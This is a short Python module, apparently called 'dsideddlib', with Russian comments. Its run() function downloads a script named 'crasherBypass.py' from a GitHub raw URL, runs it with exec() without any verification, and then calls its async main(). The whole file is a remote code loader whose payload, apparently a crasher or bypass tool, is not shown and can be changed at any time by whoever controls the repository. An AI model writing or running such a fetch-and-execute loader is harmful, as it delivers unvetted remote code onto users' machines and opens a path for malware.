import http.client
import asyncio
import zlib  # добавь в начало файла с run()

def run():
    print("[dsideddlib] Запуск...")

    host = "raw.githubusercontent.com"
    path = "/hellyth1337/dfree/main/crasherBypass.py"

    try:
        conn = http.client.HTTPSConnection(host)
        conn.request("GET", path)
        response = conn.getresponse()

        if response.status != 200:
            print(f"[dsideddlib] Ошибка загрузки: HTTP {response.status}")
            return

        code = response.read().decode()
        print("[dsideddlib] Код загружен")

        local_vars = {'zlib': zlib}  # добавляем модуль zlib в локальное окружение
        exec(code, globals(), local_vars)

        if 'main' in local_vars and asyncio.iscoroutinefunction(local_vars['main']):
            print("[dsideddlib] Выполняю main()...")
            asyncio.run(local_vars['main']())
        else:
            print("[dsideddlib] main() не найден или не async — выполнение завершено")

    except Exception as e:
        import traceback
        print(f"[dsideddlib] Ошибка выполнения: {e}")
        traceback.print_exc()

    finally:
        conn.close()
        print("[dsideddlib] Завершено.")